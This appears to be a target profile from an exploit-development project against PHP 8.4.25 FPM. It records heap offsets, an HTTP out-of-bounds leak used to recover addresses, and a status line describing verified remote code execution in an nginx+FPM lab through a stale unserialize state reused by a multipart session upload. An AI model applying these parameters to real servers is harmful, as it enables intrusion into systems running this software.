name: php-8.4.25-fpm

no_oracle.bases: stable one-slot geometry: d_off=0x7f000, k=0xfe8; recalibrate if the allocator layout changes

leak.bases: leaked over HTTP from a stale short-session string OOB read

status: RCE verified in the nginx+FPM lab: post-RINIT OOM leaves BG(unserialize) stale (level=1), the pre-RINIT rfc1867 session_start of a follow-up multipart reuses the freed struct, and two 4 KB pads + a 16 KB big field cover d at 0x7f000. The HTTP stale-string leak recovers chunk/PIE with the 8.4.25 PIE offset. The command runs and the consumer worker aborts afterwards; FPM respawns it.
